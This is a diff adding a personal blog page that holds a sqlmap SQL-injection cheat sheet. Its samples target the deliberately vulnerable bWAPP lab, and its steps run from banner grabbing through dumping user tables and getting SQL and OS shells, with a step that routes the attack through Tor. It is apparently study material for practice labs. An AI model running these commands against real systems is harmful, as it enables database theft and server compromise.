@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Mi Blog</title>
+  <link rel="stylesheet" href="file:///Users/b0ydc/Documents/CYBER/SITE/css/styles.css">
+</head>
+<body>
+  <header>
+    <h4 align="right">@b0ydC</h4>
+  </header>
+
+  <main>
+    <article>
+     
+PRE-REQS: <br><br>
+  
+1. vulnerable field<br>
+2. auth required ?<br><br>
+
+<h2>0x1: GET BANNER</h2>
+
+sqlmap -u "INSERT_VULN_URL" --cookie=" " -b<br><br>
+
+<u>SAMPLE:</u> sqlmap -u "http://ip_addr/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1e80" -b <br><br>
+
+<h2>0x2: GET DATABASE USERS [CURRENT]</h2>
+
+sqlmap -u "INSERT_VULN_URL" --cookie=" " --users<br><br>
+
+<u>SAMPLE:</u> sqlmap -u "http://ip_addr/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1e80" --users<br><br>
+
+<h2>0x3: GET DATABASES</h2>
+
+sqlmap -u "INSERT_VULN_URL" --cookie=" " --dbs<br><br><br>
+
+<u>SAMPLE:</u> sqlmap -u "http://ip_addr/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1e80" --dbs<br><br>
+
+<h2>0x4: GET TABLES</h2>
+
+sqlmap -u "INSERT_VULN_URL" --cookie=" " -D DATABASE_NAME --tables<br><br>
+
+<u>SAMPLE:</u> sqlmap -u "http://ip_addr/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1e80" -D bWAPP --tables<br><br>
+
+<h2>0x5: GET COLUMNS FROM TABLE</h2>
+
+sqlmap -u "INSERT_VULN_URL" --cookie=" " -D DATABASE_NAME -T TABLE_NAME --columns<br><br>
+
+<u>SAMPLE:</u> sqlmap -u "http://ip_addr/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1e80" -D bWAPP -T users --columns <br><br>
+
+<h2>0x6: DUMP A TABLE</h2>
+
+sqlmap -u "INSERT_VULN_URL" --cookie=" " -D DATABASE_NAME -T TABLE_NAME --dump<br><br>
+
+<u>SAMPLE:</u> sqlmap -u "http://ip_addr/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1e80" -D bWAPP -T users --dump<br><br>
+
+<h2>0x7: DUMP SPECIFIC COLUMNS</h2>
+
+sqlmap -u "INSERT_VULN_URL" --cookie=" " -D DATABASE_NAME -T TABLE_NAME -C column_name1,column_name2 --dump<br><br>
+
+<u>SAMPLE:</u> sqlmap -u "http://ip_addr/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1e80" -D bWAPP -T users -C login,email --dump <br><br>
+
+<h2>0x8: GET INTERACTIVE DB SHELL</h2>
+
+sqlmap -u "INSERT_VULN_URL" --cookie=" " --sql-shell<br><br>
+
+<u>SAMPLE:</u> sqlmap -u "http://ip_addr/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1e80" --sql-shell<br><br>
+
+<h2>0x9: GET SYSTEM OS SHELL</h2>
+
+sqlmap -u "INSERT_VULN_URL" --cookie=" " --os-shell<br><br>
+
+<u>SAMPLE:</u> sqlmap -u "http://ip_addr/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1e80" --os-shell <br><br>
+
+<h2>x10: USE PROXY TOR</h2>
+
+sqlmap --tor --tor-type=SOCKS5 --check-tor -u "INSERT_VULN_URL" --cookie=" " -b<br><br>
+
+<u>SAMPLE:</u> sqlmap --tor --tor-type=SOCKS5 --check-tor -u "http://ip_addr/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1e80" -b <br><br>
+
+<h2>0x11: EXPLOIT SPECIFIC TECHNIQUE</h2>
+
+sqlmap -u "INSERT_VULN_URL" --cookie=" " --technique=?<br><br>
+
+<u>SAMPLE:</u> sqlmap -u "http://ip_addr/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1e80" --technique=U<br><br>
+
+<h2>0x12: USE REQUEST AS FILE</h2>
+
+sqlmap -r [request_filename]<br><br>
+
+<u>SAMPLE:</u> sqlmap -r request.txt <br><br>
+
+NOTE: It can be used to validate entire request for any vulnerability. <br><br>
+
+--is-dba = to check if the current user is dba, reuslt will be true or false<br>
+-p = specify the vuln parameter if it is not clear<br><br>
+
+
+NOTES:<br><br>
+  
+1. Vulnerable field can be specified with -D flag.<br>
+2. Most of time file results are stored in "/home/USER/.local/share/sqlmap/output/..."<br>
+3. Use burpsuite to intercept the traffic to know more about the authentication/session used<br>
+4. Copy request from burpsuite to use it using sqlmap.<br>
+5. Request file of a login form can be used to see if the parameters are vulnerable.
+
+
+    </article>
+
+
+  </main>
+
+</body>
+</html>
